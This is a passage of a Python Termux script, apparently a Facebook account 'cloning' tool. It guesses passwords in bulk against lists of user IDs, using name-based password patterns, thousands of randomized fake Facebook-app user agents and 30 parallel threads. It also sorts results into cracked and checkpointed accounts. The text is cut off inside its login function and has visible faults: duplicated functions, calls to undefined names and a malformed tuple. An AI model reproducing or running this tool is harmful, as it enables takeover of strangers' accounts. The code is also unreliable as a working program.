[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G925F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;'+'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
	ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
	return ua

xxxx="[FBAN/"+"FB4A;FBAV/"+"61.0.0.15.69;FBBV/"+"20748125;FBDM/"+"{density=1.0,width=600,height=976};FBLC/"+"es_LA;FBCR/"+"MOVISTAR;FBMF/"+"Rockchip;FBBD/"+"K5-3G;FBPN/"+"com.facebook.katana;FBDV/"+"K5-3G;FBSV/"+"5.1.1;nullFBCA/"+"x86:armeabi-v7a;]"

folder_path = '/sdcard/TAMOOR'
try:
	os.makedirs(folder_path, exist_ok=True)
except:
	pass
 #_________[ LOOPS ]______>>
loop=0
oks=[]
cps=[]
twf=[]
pcp=[]
id=[]
tokenku=[]
#_________[ IMPORTING TIME MODULS ]______>>
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
def clear():
        os.system('clear')
        print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#-----------------------[DATE Checker For FILE CLONING]-----------------------#
def joined(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:9] in ['100000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:8] in ['10000000']        :creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = '\33[1;37m| \33[1;33m2009' 
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:creation = '\33[1;37m| \33[1;33m2010' 
        elif ids[:6] in ['100001']          :creation = '\33[1;37m| \33[1;33m2010\33[1;37m/\33[1;33m2011'
        elif ids[:6] in ['100002','100003'] :creation = '\33[1;37m| \33[1;33m2011\33[1;37m/\33[1;33m2012'
        elif ids[:6] in ['100004']          :creation = '\33[1;37m| \33[1;33m2012\33[1;37m/\33[1;33m2013'
        elif ids[:6] in ['100005','100006'] :creation = '\33[1;37m| \33[1;33m2013\33[1;37m/\33[1;33m2014'
        elif ids[:6] in ['100007','100008'] :creation = '\33[1;37m| \33[1;33m2014\33[1;37m/\33[1;33m2015'
        elif ids[:6] in ['100009']          :creation = '\33[1;37m| \33[1;33m2015' 
        elif ids[:5] in ['10001']           :creation = '\33[1;37m| \33[1;33m2015\33[1;37m/\33[1;33m2016'
        elif ids[:5] in ['10002']           :creation = '\33[1;37m| \33[1;33m2016\33[1;37m/\33[1;33m2017'
        elif ids[:5] in ['10003']           :creation = '\33[1;37m| \33[1;33m2018\33[1;37m/\33[1;33m2019'
        elif ids[:5] in ['10004']           :creation = '\33[1;37m| \33[1;33m2019\33[1;37m/\33[1;33m2020'
        elif ids[:5] in ['10005']           :creation = '\33[1;37m| \33[1;33m2020' 
        elif ids[:5] in ['10006','10007','']:creation = '\33[1;37m| \33[1;33m2021' 
        elif ids[:5] in ['10008']           :creation = '\33[1;37m| \33[1;33m2022' 
        else:creation=''
    elif len(ids) in [9,10]:
        creation = '\33[1;37m| \33[1;33m2008/2009'
    elif len(ids)==8:
        creation = '\33[1;37m| \33[1;33m2007/2008'
    elif len(ids)==7:
        creation = '\33[1;37m| \33[1;33m2006/2007'
    else:creation=''
    return creation
#-----------------------[DATE Checker For UID CLONING]-----------------------#
def joined(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:9] in ['100000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:8] in ['10000000']        :creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:creation = '\33[1;37m| \33[1;33m2010' 
        elif uid[:6] in ['100001']          :creation = '\33[1;37m| \33[1;33m2010\33[1;37m/\33[1;33m2011'
        elif uid[:6] in ['100002','100003'] :creation = '\33[1;37m| \33[1;33m2011\33[1;37m/\33[1;33m2012'
        elif uid[:6] in ['100004']          :creation = '\33[1;37m| \33[1;33m2012\33[1;37m/\33[1;33m2013'
        elif uid[:6] in ['100005','100006'] :creation = '\33[1;37m| \33[1;33m2013\33[1;37m/\33[1;33m2014'
        elif uid[:6] in ['100007','100008'] :creation = '\33[1;37m| \33[1;33m2014\33[1;37m/\33[1;33m2015'
        elif uid[:6] in ['100009']          :creation = '\33[1;37m| \33[1;33m2015' 
        elif uid[:5] in ['10001']           :creation = '\33[1;37m| \33[1;33m2015\33[1;37m/\33[1;33m2016'
        elif uid[:5] in ['10002']           :creation = '\33[1;37m| \33[1;33m2016\33[1;37m/\33[1;33m2017'
        elif uid[:5] in ['10003']           :creation = '\33[1;37m| \33[1;33m2018\33[1;37m/\33[1;33m2019'
        elif uid[:5] in ['10004']           :creation = '\33[1;37m| \33[1;33m2019\33[1;37m/\33[1;33m2020'
        elif uid[:5] in ['10005']           :creation = '\33[1;37m| \33[1;33m2020' 
        elif uid[:5] in ['10006','10007','']:creation = '\33[1;37m| \33[1;33m2021' 
        elif uid[:5] in ['10008']           :creation = '\33[1;37m| \33[1;33m2022' 
        elif uid[:5] in ['10009']           :creation = '\33[1;37m| \33[1;33m2023' 
        else:creation=''
    elif len(uid) in [9,10]:
        creation = '\33[1;37m| \33[1;33m2008/2009'
    elif len(uid)==8:
        creation = '\33[1;37m| \33[1;33m2007/2008'
    elif len(uid)==7:
        creation = '\33[1;37m| \33[1;33m2006/2007'
    else:creation=''
    return creation
#_________[ PRINT LINE ]______>>
def linex():
    print('\033[1;97m====================================================')
#_________[ TOOL LOGO ]______>>

logo = """\033[1;30m
                  ▉▉▉▉
                 ▂▉▉▉▉▂
                \033[1;33m╰▏ ┛┗ ▕╯
                 ╲ 👅 ╱
                 \033[1;32m╱▔╲╱▔╲
               ╱ ╱▏╭╮▕╲ ╲
               ╲ ╲▏╭╮▕╱ ╱       \033[1;31m ╔╦╗     ╔╦╗
                \033[1;35m ╲▉▉▉▉╱         \033[1;31m  ║      ║║║
                \033[1;34m  ▏╭╮▕          \033[1;31m  ╩   o  ╩ ╩
                \033[1;34m  ▏▏▕▕
                  ▏▏▕▕
                \033[1;31m ╭╰ ╮╭╰ ╮
               \033[1;39msᴜʙ \033[1;35mᴋᴀ \033[1;36mʙᴀᴀᴘ
\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
\033[0;92m
 \
      

 ███▄ ▄███▓ █    ██   ▄████  ██░ ██  ▄▄▄       ██▓    
▓██▒▀█▀ ██▒ ██  ▓██▒ ██▒ ▀█▒▓██░ ██▒▒████▄    ▓██▒    
▓██    ▓██░▓██  ▒██░▒██░▄▄▄░▒██▀▀██░▒██  ▀█▄  ▒██░    
▒██    ▒██ ▓▓█  ░██░░▓█  ██▓░▓█ ░██ ░██▄▄▄▄██ ▒██░    
▒██▒   ░██▒▒▒█████▓ ░▒▓███▀▒░▓█▒░██▓ ▓█   ▓██▒░██████▒
░ ▒░   ░  ░░▒▓▒ ▒ ▒  ░▒   ▒  ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░▓  ░
░  ░      ░░░▒░ ░ ░   ░   ░  ▒ ░▒░ ░  ▒   ▒▒ ░░ ░ ▒  ░
░      ░    ░░░ ░ ░ ░ ░   ░  ░  ░░ ░  ░   ▒     ░ ░   
       ░      ░           ░  ░  ░  ░      ░  ░    ░  ░
                                                      



 

\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
\033[1;39m━▷ \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m◈✙◈\033[1;33m MR TAMOOR
\033[1;39m━▷ \033[0;91m𝙏𝙀𝘼𝙈     \033[1;39m◈✙◈\033[1;31m TEAM OF MUGHAL🇵🇰🇵🇰
\033[1;39m━▷ \033[0;91m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m◈✙◈ \033[1;33mTAMOOR MUGHAL🥵🥵🇵🇰🇵🇰
\033[1;39m━▷ \033[0;91m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;34mFACEBOOK HELPING ZONE 🙂🙈🇵🇰🇵🇰
\033[1;39m━▷ \033[0;91m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m◈✙◈ \033[0;92mFREE AND ENJOY🇵🇰🇵🇰🇵🇰
\033[1;39m━▷ \033[0;91m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;31m0.2🥵🥵🇵🇰🇵🇰
\033[1;39m━▷ \033[1;36m𝙁𝙀𝙀𝙇 𝙏𝙃𝙀 𝙋𝙊𝙒𝙀𝙍 𝙊𝙁  𝐓𝐀𝐌𝐎𝐎𝐑 𝙊𝙒𝙉𝙀𝙍 𝙊𝙁 𝐌𝐔𝐆𝐇𝐀𝐋 𝐁𝐑𝐀𝐍𝐃
\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●

--------------------------------------------------

\033[1;32m[•] Will Update Every 2 Days  


\033[1;34m[•] YOUR MIND IS YOUR  BEST  WEAPON

--------------------------------------------------             

 """
 #_________[ MODULES CLEAR]______>>
clear() 
#_________[ USER IP SERVER ]______>>
ip = requests.get("https://api.ipify.org").text
print("\t \033[0;97m[•] \x1b[1;92mUSER IP ADDRESS \x1b[1;91m:\033[1;36m "+ip)
linex()
#_________[ LOGIN KEY ]______>>
CorrectUsername = 'PUBLIC'
key = 'true'
while key == 'true':
    username = input('\033[0;97m[•]\033[1;96m•────➤\033[1;92mENTER KEY \033[1;91m: \x1b[1;92m')
    if username == CorrectUsername:
            print('\033[1;97m====================================================\n\033[0;97m[•]\033[1;32m LOGGED IN MUGHAL TOOL SUCCESSFULLY') 
            time.sleep(1)
            clear()
            key = 'false'
       
#_________[ MAIN MENU ]______>>   
def Main_TAMOOR():
		clear()
		print(f'\033[1;33m [1] File Cloning \n [2] Random Cloning \n [3] Gmail Cloning \n [4] OWNER WhatsApp NUMBER \n [5] Contact tool owner \n [0] Exit')
		linex()
		shm= input('\033[1;37m [+] Select option: ')
		if shm =='1':
		 file_crack()
		elif shm =='2':
			r_crack()
		elif shm =='3':
			gmail()
		elif shm =='4':
			wp=('KpSthW03CQR0wOim0sKtFX')
			os.system(f'xdg-open http://Wa.me/+923049211464')
			Main_TAMOOR()
		elif shm =='5':
			os.system('xdg-open https://www.facebook.com/tamoor.arshad.56')
			Main_TAMOOR()
		elif shm =='0':
			exit(' Thanks For Using our tool ')
		else:
			print('\033[1;37m [+] Select valid option\033[1;37m ')
			time.sleep(0.5)
			Main_TAMOOR()
			
#_________[ NEW UA ]______>>   
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
ugen=[]
ugen=[]
useragent=[]
header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-N986N Build/ZK83T5) [FBAN/FB4A;FBAV/979.2.9.20.981;FBPN/com.facebook.katana;FBLC/en_US;FBBV/687217741;FBCR/Glo Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-N986N;FBSV/11;FBCA/x86:armeabi-v7a;FBDM/{density=2.5,width=1080,height=2220};FB_FW/0;FBRV/0;]"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 9; Nokia C2 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/297.0.0.13.113;]"}
for xd in range(1000):
        aa='Mozilla/5.0 (Linux; Android 10; Nokia 1 Plus Build/QP1A.190711.020; wv)'
        b=random.choice(['6','7','8','9','10','11','12',])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/319.0.0.7.107;]'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)

for agent in range(1000):
        aa='Mozilla/5.0 (Linux; Android 9; Nokia C2 Build/PPR1.180610.011; wv)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='Android 9; Nokia C2 Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/297.0.0.13.113;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)        
for agent in range(10000):
        aa='Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='CPU iPhone OS 16_0 like Mac OS X'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/605.1.15 (KHTML, like Gecko)'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile/20A5312g [FBAN/FBIOS;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/cs_CZ;FBOP/5]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)      
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 11; Nokia C20 Plus Build/RP1A.201005.001; wv)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='Android 11; Nokia C20 Plus Build/RP1A.201005.001; wv'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/ta_IN;FBAV/331.0.0.9.105;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)      
def linex():
        print(47*'\033[38;5;46m▬\033[1;37m')
def clear():
        os.system(f'clear')
    
#_________[ FILE CLONING ]______>>       
def file_crack():
		clear()
		File = input(f' [\033[1;32m✓\033[1;37m] 𝗣𝗨𝗧 𝗙𝗜𝗟𝗘 𝗟𝗢𝗖𝗔𝗧𝗜𝗢𝗡 [\033[1;32m❯\033[1;37m] ')
		try:
			fo = open(File,'r').read().splitlines()
		except FileNotFoundError:
			print(f' [\033[1;32mX\033[1;37m] open location Not Found ')
			exit()
		print(f' [\033[38;5;46m1\033[1;37m] 𝗠𝗘𝗧𝗛𝗢𝗗 \033[1;32m1 \n [\033[38;5;46m2\033[1;37m] 𝗠𝗘𝗧𝗛𝗢𝗗 \033[1;32m2\033[1;37m ')
		mthd=input(f' [\033[1;32m✓\033[1;37m] Choice : ')
		plist=[]
		try:
			ps_limit = int(input(f' [\033[1;32m?\033[1;37m] How Many Passwords Do You Want To Add [\033[1;32m⟩\033[1;37m] '))
		except:
			ps_limit =1
		print(f' [\033[1;32m•\033[1;37m] Example: \033[1;36mfirst last,firtslast,first123 \033[1;37m')
		for i in range(ps_limit):
			plist.append(input(f' [\033[1;32m✓\033[1;37m] Put password {i+1}[\033[1;32m❯\033[1;37m] '))
		print(f' [\033[1;32m?\033[1;37m] Do You Went Show CP IDs (y/n): ')
		cx=input(f' [\033[1;32m✓\033[1;37m] Choice : ')
		if cx in ['n','N','no','NO','2']:
			pcp.append(f'n')
		else:
			pcp.append(f'y')
		with tred(max_workers=30) as TAMOOR:
			clear()
			total_ids = str(len(fo))
			print(f' Total Account : \033[1;32m'+total_ids+f' \n \033[1;37mMethod : \033[1;32mM{mthd}\033[1;37m')
			print(f"\033[1;36m Use Flight Mode For Speed Up\033[1;37m")
			linex()
			for user in fo:
				ids,names = user.split('|')
				passlist = plist
				if mthd in ['1','01']:
				 crack_submit.submit(m1,ids,names,passlist)
				elif mthd in ['2','02']:
				 crack_submit.submit(m2,ids,names,passlist)
				else:
				 crack_submit.submit(m1,ids,names,passlist)

#_________[ MATHOD M1 ]______>>   
				
def M1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [open] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'TAMOOR'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
